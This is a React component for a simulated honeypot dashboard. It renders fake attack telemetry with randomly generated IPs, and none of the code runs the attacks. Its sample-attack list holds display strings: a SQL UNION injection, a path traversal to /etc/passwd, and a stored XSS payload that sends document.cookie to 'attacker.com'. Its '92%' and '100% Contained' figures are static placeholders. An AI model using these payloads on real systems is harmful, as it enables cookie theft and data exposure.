import { useState, useEffect, useRef } from "react";
import { Shield, Play, RotateCcw, AlertTriangle, Cpu, Terminal, Zap, CheckCircle2, Lock } from "lucide-react";

interface TelemetryLog {
  id: string;
  timestamp: string;
  ip: string;
  attackVector: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
  status: "TRAPPED" | "ANALYZING" | "ISOLATED";
  honeypotNode: string;
  payload: string;
}

const SAMPLE_ATTACKS = [
  {
    vector: "SSH Brute-Force (Hydra Botnet)",
    payload: "USER root PASS admin123 --port 22",
    honeypot: "Node-01 (Decoy SSH Bastion)",
    severity: "HIGH" as const,
  },
  {
    vector: "SQL Injection Probe (Union Attack)",
    payload: "GET /api/v1/user?id=1' UNION SELECT credit_card FROM vault--",
    honeypot: "Node-03 (Decoy PostgreSQL API)",
    severity: "CRITICAL" as const,
  },
  {
    vector: "SYN Flood DDoS Probe",
    payload: "TCP SYN [50,000 pkts/sec] Target: Port 443",
    honeypot: "Node-02 (Decoy Load Balancer)",
    severity: "CRITICAL" as const,
  },
  {
    vector: "DirBuster Path Traversal",
    payload: "GET /../../etc/passwd HTTP/1.1",
    honeypot: "Node-04 (Decoy Nginx Web Server)",
    severity: "MEDIUM" as const,
  },
  {
    vector: "Cross-Site Scripting (XSS Stored)",
    payload: "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
    honeypot: "Node-05 (Decoy Comment Endpoint)",
    severity: "MEDIUM" as const,
  },
];

export function HoneypotSimulator() {
  const [logs, setLogs] = useState<TelemetryLog[]>([
    {
      id: "log-1",
      timestamp: "19:04:12.890",
      ip: "185.220.101.4",
      attackVector: "SSH Brute-Force (Hydra Botnet)",
      severity: "HIGH",
      status: "TRAPPED",
      honeypotNode: "Node-01 (Decoy SSH Bastion)",
      payload: "USER root PASS admin123 --port 22",
    },
    {
      id: "log-2",
      timestamp: "19:05:01.320",
      ip: "194.26.29.112",
      attackVector: "SQL Injection Probe (Union Attack)",
      severity: "CRITICAL",
      status: "ISOLATED",
      honeypotNode: "Node-03 (Decoy PostgreSQL API)",
      payload: "GET /api/v1/user?id=1' UNION SELECT credit_card FROM vault--",
    },
  ]);

  const [trappedCount, setTrappedCount] = useState(148);
  const [riskScore, setRiskScore] = useState(18);
  const [isRunning, setIsRunning] = useState(false);
  const logContainerRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (logContainerRef.current) {
      logContainerRef.current.scrollTop = logContainerRef.current.scrollHeight;
    }
  }, [logs]);

  const triggerAttack = (attackIndex?: number) => {
    const attack = (attackIndex !== undefined ? SAMPLE_ATTACKS[attackIndex] : SAMPLE_ATTACKS[Math.floor(Math.random() * SAMPLE_ATTACKS.length)])!;
    const randomIP = `${Math.floor(Math.random() * 200) + 10}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
    const now = new Date();
    const timestamp = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}.${now.getMilliseconds().toString().padStart(3, '0')}`;

    const newLog: TelemetryLog = {
      id: `log-${Date.now()}`,
      timestamp,
      ip: randomIP,
      attackVector: attack.vector,
      severity: attack.severity,
      status: "TRAPPED",
      honeypotNode: attack.honeypot,
      payload: attack.payload,
    };

    setLogs((prev) => [...prev.slice(-25), newLog]);
    setTrappedCount((c) => c + 1);
    setRiskScore((s) => Math.min(98, s + (attack.severity === "CRITICAL" ? 14 : 7)));

    setTimeout(() => {
      setLogs((prev) =>
        prev.map((l) => (l.id === newLog.id ? { ...l, status: "ISOLATED" } : l))
      );
      setRiskScore((s) => Math.max(12, s - 5));
    }, 2200);
  };

  const toggleAutoSim = () => {
    setIsRunning(!isRunning);
  };

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isRunning) {
      interval = setInterval(() => {
        triggerAttack();
      }, 1800);
    }
    return () => clearInterval(interval);
  }, [isRunning]);

  const clearLogs = () => {
    setLogs([]);
    setRiskScore(12);
  };

  return (
    <div className="rounded-xl border border-line bg-panel p-6 shadow-2xl">
      <div className="flex flex-col gap-4 border-b border-line pb-5 sm:flex-row sm:items-center sm:justify-between">
        <div>
          <div className="flex items-center gap-2">
            <span className="flex size-2.5 rounded-full bg-mint animate-pulse" />
            <span className="font-mono text-xs uppercase tracking-[0.2em] text-mint font-semibold">
              Interactive Telemetry Sandbox
            </span>
          </div>
          <h3 className="mt-1 text-xl font-medium text-ink">
            Multi-Layer Security Dashboard (MLSD) Honeypot Trapping Simulator
          </h3>
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={toggleAutoSim}
            className={`inline-flex items-center gap-2 rounded-md px-3.5 py-1.5 font-mono text-xs transition-colors ${
              isRunning
                ? "bg-ember/20 text-ember border border-ember/40 hover:bg-ember/30"
                : "bg-mint/15 text-mint border border-mint/30 hover:bg-mint/25"
            }`}
          >
            {isRunning ? <Zap size={14} className="animate-spin" /> : <Play size={14} />}
            {isRunning ? "Stop Telemetry Stream" : "Start Live Stream"}
          </button>
          <button
            onClick={clearLogs}
            className="inline-flex items-center gap-1.5 rounded-md border border-line bg-obsidian px-2.5 py-1.5 font-mono text-xs text-ink-muted hover:text-ink"
            title="Clear logs"
          >
            <RotateCcw size={13} />
          </button>
        </div>
      </div>

      {/* Top telemetry metric widgets */}
      <div className="mt-5 grid grid-cols-2 gap-3 sm:grid-cols-4">
        <div className="rounded-lg border border-line/70 bg-obsidian/60 p-3.5">
          <div className="flex items-center justify-between text-ink-muted">
            <span className="font-mono text-[10px] uppercase tracking-wider">Trapped Threats</span>
            <Shield size={14} className="text-mint" />
          </div>
          <p className="mt-2 font-mono text-2xl font-bold text-ink">{trappedCount}</p>
          <span className="mt-1 block font-mono text-[10px] text-mint">100% Contained</span>
        </div>

        <div className="rounded-lg border border-line/70 bg-obsidian/60 p-3.5">
          <div className="flex items-center justify-between text-ink-muted">
            <span className="font-mono text-[10px] uppercase tracking-wider">Telemetry Score</span>
            <Cpu size={14} className="text-ice" />
          </div>
          <p className="mt-2 font-mono text-2xl font-bold text-ice">92%</p>
          <span className="mt-1 block font-mono text-[10px] text-ink-muted">ML Classifier Accuracy</span>
        </div>

        <div className="rounded-lg border border-line/70 bg-obsidian/60 p-3.5">
          <div className="flex items-center justify-between text-ink-muted">
            <span className="font-mono text-[10px] uppercase tracking-wider">Current Threat Level</span>
            <AlertTriangle size={14} className={riskScore > 50 ? "text-ember" : "text-mint"} />
          </div>
          <p className={`mt-2 font-mono text-2xl font-bold ${riskScore > 50 ? "text-ember" : "text-mint"}`}>
            {riskScore}%
          </p>
          <div className="mt-1.5 h-1.5 w-full overflow-hidden rounded-full bg-line">
            <div
              className={`h-full transition-all duration-500 ${riskScore > 50 ? "bg-ember" : "bg-mint"}`}
              style={{ width: `${riskScore}%` }}
            />
          </div>
        </div>

        <div className="rounded-lg border border-line/70 bg-obsidian/60 p-3.5">
          <div className="flex items-center justify-between text-ink-muted">
            <span className="font-mono text-[10px] uppercase tracking-wider">Active Decoys</span>
            <Lock size={14} className="text-ember" />
          </div>
          <p className="mt-2 font-mono text-2xl font-bold text-ink">5 Nodes</p>
          <span className="mt-1 block font-mono text-[10px] text-ember">Isolated Sandbox</span>
        </div>
      </div>

      {/* Manual attack trigger launcher */}
      <div className="mt-5">
        <p className="font-mono text-xs text-ink-muted mb-2">Simulate Specific Threat Attack Vectors:</p>
        <div className="flex flex-wrap gap-2">
          {SAMPLE_ATTACKS.map((atk, idx) => (
            <button
              key={atk.vector}
              onClick={() => triggerAttack(idx)}
              className="rounded border border-line bg-obsidian/80 px-3 py-1.5 font-mono text-[11px] text-ink-muted hover:border-ember/60 hover:text-ink transition-colors flex items-center gap-1.5"
            >
              <Zap size={11} className="text-ember" />
              {atk.vector.split(" ")[0]} Attack
            </button>
          ))}
        </div>
      </div>

      {/* Terminal log view */}
      <div className="mt-5 rounded-lg border border-line bg-obsidian font-mono text-xs overflow-hidden">
        <div className="flex items-center justify-between border-b border-line px-4 py-2 bg-panel-2/60">
          <div className="flex items-center gap-2 text-ink-muted">
            <Terminal size={14} className="text-ember" />
            <span className="text-[11px]">telemetry_stream.log (Central Collector)</span>
          </div>
          <span className="text-[10px] text-ink-muted/70">{logs.length} events logged</span>
        </div>

        <div
          ref={logContainerRef}
          className="p-4 space-y-3 max-h-[280px] overflow-y-auto scrollbar-thin scanline-overlay"
        >
          {logs.length === 0 ? (
            <div className="py-8 text-center text-ink-muted/50 italic">
              No active events. Click "Start Live Stream" or select an attack vector above to begin.
            </div>
          ) : (
            logs.map((log) => (
              <div
                key={log.id}
                className="p-2.5 rounded bg-panel/70 border border-line/40 hover:border-line transition-all rise-in"
              >
                <div className="flex flex-wrap items-center justify-between gap-2 text-[11px]">
                  <div className="flex items-center gap-2">
                    <span className="text-ink-muted/60">[{log.timestamp}]</span>
                    <span className="text-ember font-bold">{log.ip}</span>
                    <span className="text-ink font-semibold">{log.attackVector}</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <span
                      className={`px-1.5 py-0.5 rounded text-[10px] font-bold ${
                        log.severity === "CRITICAL"
                          ? "bg-red-500/20 text-red-400 border border-red-500/30"
                          : log.severity === "HIGH"
                          ? "bg-amber-500/20 text-amber-400 border border-amber-500/30"
                          : "bg-blue-500/20 text-blue-400 border border-blue-500/30"
                      }`}
                    >
                      {log.severity}
                    </span>
                    <span
                      className={`px-2 py-0.5 rounded text-[10px] font-mono flex items-center gap-1 ${
                        log.status === "TRAPPED"
                          ? "bg-mint/20 text-mint border border-mint/40"
                          : "bg-ice/20 text-ice border border-ice/40"
                      }`}
                    >
                      <CheckCircle2 size={10} />
                      {log.status}
                    </span>
                  </div>
                </div>
                <div className="mt-1.5 text-[10px] text-ink-muted flex flex-wrap justify-between gap-2">
                  <span>Target: <code className="text-ice">{log.honeypotNode}</code></span>
                  <span>Payload: <code className="text-ink-muted bg-obsidian px-1.5 py-0.5 rounded border border-line/50">{log.payload}</code></span>
                </div>
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
}
